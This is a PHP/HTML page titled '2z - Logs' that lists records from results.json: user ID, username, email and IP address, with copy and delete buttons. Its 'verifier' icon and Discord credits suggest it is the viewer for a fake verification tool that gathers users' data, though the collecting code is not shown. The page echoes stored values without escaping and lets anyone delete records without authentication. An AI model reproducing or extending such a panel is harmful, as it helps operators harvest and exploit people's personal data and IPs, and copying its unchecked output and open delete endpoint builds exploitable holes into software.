# Created by nosztalgia (lv8)
# My discord server: https://discord.gg/yG4my2nqTa
# Credits to https://github.com/MarkisDev

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>2z - Logs</title>
    <link rel="icon" type="image/png" href="../verifier.png">
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
            height: 100vh;
            background-color: #000;
            background-image: url('https://c.tenor.com/8x6bFHgnlhEAAAAd/tenor.gif');
            background-size: cover;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .scrollable-container {
            height: 80vh;
            overflow: auto;
            scrollbar-width: thin;
        }

        .scrollable-container::-webkit-scrollbar {
            width: 8px;
        }

        .scrollable-container::-webkit-scrollbar-track {
            background: transparent;
        }

        .scrollable-container::-webkit-scrollbar-thumb {
            background-color: rgba(255, 255, 255, 0.5);
            border-radius: 4px;
        }

        .container {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            grid-gap: 20px;
        }

        .box {
            position: relative;
            background-color: #f0f0f0;
            border-radius: 10px;
            padding: 20px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            user-select: none;
            text-align: center;
        }

        .box p {
            margin: 8px 0;
            font-size: 16px;
            color: #333;
            line-height: 1.5;
        }

        h2 {
            font-size: 20px;
            margin-bottom: 10px;
            color: #555;
        }

        .copy-button-container {
            text-align: center;
        }

        .copy-button {
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 5px;
            padding: 10px 20px;
            cursor: pointer;
            font-size: 16px;
            transition: background-color 0.3s ease;
        }

        .copy-button:hover {
            background-color: #45a049;
        }

        .delete-icon {
            position: absolute;
            top: 10px;
            right: 10px;
            cursor: pointer;
            font-size: 20px;
        }

        .confirmation-box {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.2);
            z-index: 9999;
            width: 300px;
            padding: 20px;
            text-align: center;
            display: none;
        }

        .confirmation-box h3 {
            margin-top: 0;
            font-size: 18px;
            color: #333;
        }

        .confirmation-buttons {
            display: flex;
            justify-content: center;
            margin-top: 20px;
        }

        .confirmation-buttons button {
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            margin: 0 10px;
        }

        .confirmation-buttons button.yes {
            background-color: #4CAF50;
            color: white;
            border: none;
        }

        .confirmation-buttons button.no {
            background-color: #f44336;
            color: white;
            border: none;
        }

        .draggable-handle {
            width: 20px;
            height: 20px;
            cursor: move;
            position: absolute;
            top: 10px;
            left: 10px;
            background-color: lightblue;
            border-radius: 50%;
        }
    </style>
</head>
<body>
    <div class="scrollable-container">
        <div class="container">
            <?php
            $json_contents = file_get_contents("results.json");
            $data = json_decode($json_contents, true);

            foreach ($data as $result) :
            ?>
                <div class="box" id="box-<?php echo $result["id"]; ?>">
                    <div class="draggable-handle"></div>
                    <h2>User Information</h2>
                    <p><strong>ID:</strong> <?php echo $result["id"]; ?></p>
                    <p><strong>Username:</strong> <?php echo $result["username"]; ?></p>
                    <p><strong>Email:</strong> <?php echo $result["email"]; ?></p>
                    <p><strong>IP:</strong> <?php echo $result["ip"]; ?></p>
                    <div class="copy-button-container"><button class="copy-button" onclick="copyData('<?php echo $result["id"]; ?>')">Copy Data 📰</button></div>
                    <span class="delete-icon" onclick="confirmDelete('<?php echo $result["id"]; ?>')">🗑️</span>
                </div>
            <?php endforeach; ?>
        </div>
    </div>

    <div class="confirmation-box" id="confirmationBox">
        <div class="draggable-handle"></div>
        <h3>Are you sure you want to delete this item?</h3>
        <div class="confirmation-buttons">
            <button class="yes" onclick="deleteConfirmed()">Yes</button>
            <button class="no" onclick="hideConfirmationBox()">No</button>
        </div>
    </div>

    <script>
            function copyData(id) {
                var userData = document.getElementById('box-' + id);
                var idText = userData.querySelector('p:nth-of-type(1)').textContent.trim();
                var usernameText = userData.querySelector('p:nth-of-type(2)').textContent.trim();
                var emailText = userData.querySelector('p:nth-of-type(3)').textContent.trim();
                var ipText = userData.querySelector('p:nth-of-type(4)').textContent.trim();

                var dataToCopy = "" + idText + "\n" +
                                "" + usernameText + "\n" +
                                "" + emailText + "\n" +
                                "" + ipText;

                var tempTextArea = document.createElement('textarea');
                tempTextArea.value = dataToCopy;
                document.body.appendChild(tempTextArea);
                tempTextArea.select();
                document.execCommand('copy');
                document.body.removeChild(tempTextArea);

                alert("Data copied successfully!");
            }

        var idToDelete;

        function confirmDelete(id) {
            idToDelete = id;
            document.getElementById('confirmationBox').style.display = 'block';
        }

        function hideConfirmationBox() {
            document.getElementById('confirmationBox').style.display = 'none';
        }

        function deleteConfirmed() {
            var xhr = new XMLHttpRequest();
            xhr.open('POST', window.location.href, true);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            xhr.onreadystatechange = function() {
                if (xhr.readyState == 4 && xhr.status == 200) {
                    window.location.reload();
                }
            };
            xhr.send('id=' + idToDelete);
            hideConfirmationBox();
        }
    </script>

    <?php
    if (isset($_POST['id'])) {
        $idToDelete = $_POST['id'];

        $json_contents = file_get_contents('results.json');
        $data = json_decode($json_contents, true);

        foreach ($data as $key => $value) {
            if ($value['id'] == $idToDelete) {
                unset($data[$key]);
                break;
            }
        }

        $updated_json = json_encode($data, JSON_PRETTY_PRINT);
        file_put_contents('results.json', $updated_json);
    }
    ?>
</body>
</html>
